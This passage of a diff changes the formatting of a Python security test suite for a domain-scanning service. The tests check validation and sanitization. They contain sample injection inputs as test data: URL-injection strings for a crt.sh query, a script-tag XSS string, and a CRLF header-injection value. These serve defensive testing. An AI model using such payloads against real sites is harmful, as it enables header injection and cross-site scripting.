         test_domain = "test.example.com"
         url = f"https://crt.sh/?q=%.{test_domain}&output=json"
         assert test_domain in url
 
     def test_special_chars_in_domain_blocked_by_validation(self):
         """Domains with special chars are blocked before reaching crt.sh."""
-        from validation import validate_domain, clean_domain
+        from validation import clean_domain, validate_domain
+
         # These would cause URL injection in crt.sh query
         for payload in ["test&evil=1", "test%00.com", "test#fragment"]:
             result = validate_domain(clean_domain(payload))
@@ -1531,6 +1683,7 @@ class TestCrtshUrlEncoding:
 
 
 # === Security Test 9 — SVG Badge Grade Sanitization ===
+
 
 class TestBadgeGradeSanitization:
     """LOW: Grade values embedded in SVG must be sanitized to prevent XSS."""
@@ -1560,12 +1713,14 @@ class TestBadgeGradeSanitization:
 
 # === Security Test 10 — Content-Disposition Header Sanitization ===
 
+
 class TestContentDispositionSanitization:
     """LOW: Domain in Content-Disposition filename must be sanitized."""
 
     def test_safe_domain_passes_through(self):
+
         from report import report_response
-        import re
+
         resp = report_response("test report", "example.com")
         cd = resp.headers.get("content-disposition", "")
         assert 'filename="example.com-security-report.txt"' in cd
@@ -1573,7 +1728,8 @@ class TestContentDispositionSanitization:
     def test_special_chars_stripped_from_filename(self):
         """Characters outside [a-z0-9.-] must be stripped from the filename."""
         from report import report_response
-        resp = report_response("test", '<script>alert(1)</script>')
+
+        resp = report_response("test", "<script>alert(1)</script>")
         cd = resp.headers.get("content-disposition", "")
         # Angle brackets and parens must be stripped
         assert "<" not in cd
@@ -1583,6 +1739,7 @@ class TestContentDispositionSanitization:
 
     def test_quotes_stripped_from_filename(self):
         from report import report_response
+
         resp = report_response("test", 'test"injection.com')
         cd = resp.headers.get("content-disposition", "")
         # Double quotes inside the filename value would break the header
@@ -1592,6 +1749,7 @@ class TestContentDispositionSanitization:
     def test_newlines_stripped_from_filename(self):
         """CRLF in domain must not inject headers via Content-Disposition."""
         from report import report_response
+
         resp = report_response("test", "test\r\nX-Injected: true")
         cd = resp.headers.get("content-disposition", "")
         assert "\r" not in cd
@@ -1600,6 +1758,7 @@ class TestContentDispositionSanitization:
 
     def test_empty_domain_produces_valid_header(self):
         from report import report_response
+
         resp = report_response("test", "")
         cd = resp.headers.get("content-disposition", "")
         assert "attachment" in cd
@@ -1610,19 +1769,23 @@ class TestContentDispositionSanitization:
 # Self-scan bypass (Cloudflare loop prevention)
 # ============================================================
 
+
 class TestSelfScanBypass:
     """_SELF_DOMAINS causes contrastcyber.com to scan via localhost."""
 
     def test_self_domains_contains_contrastcyber(self):
         from scanner import _SELF_DOMAINS
+
         assert "contrastcyber.com" in _SELF_DOMAINS
 
     def test_self_domains_contains_www(self):
         from scanner import _SELF_DOMAINS
+
         assert "www.contrastcyber.com" in _SELF_DOMAINS
 
     def test_self_domains_does_not_contain_random(self):
         from scanner import _SELF_DOMAINS
+
         assert "example.com" not in _SELF_DOMAINS
         assert "google.com" not in _SELF_DOMAINS
 
@@ -1634,6 +1797,7 @@ class TestSelfScanBypass:
     @patch("scanner.validate_domain", return_value="188.114.97.3")
     def test_self_domain_gets_localhost_ip(self, mock_vd, mock_dl, mock_ip, mock_run, mock_save, mock_recon):
         from scanner import perform_scan
+
         mock_run.return_value = {"grade": "A", "total_score": 98}
         perform_scan("contrastcyber.com", "1.2.3.4")
         # run_scan should be called with 127.0.0.1, not 188.114.97.3
@@ -1647,6 +1811,7 @@ class TestSelfScanBypass:
     @patch("scanner.validate_domain", return_value="140.82.121.4")
     def test_normal_domain_keeps_original_ip(self, mock_vd, mock_dl, mock_ip, mock_run, mock_save, mock_recon):
         from scanner import perform_scan
+
         mock_run.return_value = {"grade": "B", "total_score": 82}
         perform_scan("github.com", "1.2.3.4")
         # run_scan should keep the original resolved IP
